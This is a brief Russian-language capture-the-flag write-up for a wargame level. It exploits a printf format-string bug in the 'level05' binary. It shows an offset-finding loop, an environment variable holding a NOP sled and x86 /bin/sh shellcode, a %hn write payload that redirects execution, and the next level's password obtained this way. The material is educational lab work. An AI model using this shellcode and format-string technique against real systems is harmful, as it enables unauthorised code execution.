> ls -la
> ./level05

Дизасемблируем код и ищем уязвимости.
> gdb ./level05
Эта программа представляет собой просто вызов fgets в stdin,
преобразует символы в буфере из верхнего регистра в нижний
и печатает буфер с помощью printf. 
Буфер непосредственно используется в printf,
а мы знаем что printf, когда принимает указатель на переменную -
записывает кол-во печатаемых символов в память по указателю.

Ищем какой указатель на переменную из printf по счету:
for((i=0; i<200; i++)); 
do echo "Index $i" && ./level05 <<< "aaaa%$i\$x";
done | grep -B1 61616161

Выполнение этой команды дает нам число 10:
Index 10
aaaa61616161

Внедряем наш шелл-код в окружающую среду:
export SHELLCODE=`python -c 'print("\x90" * 0xffff + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80")'`

Далее выполняем команду:
cat <(python -c 'print ("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%249x%10$hn" + "%65278x%11$hn")') - | ./level05

Таким образом, мы вызвали шелл-код из env. Далее вводим команды:
> cd ../level06
> cat .pass

Выдает код!
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq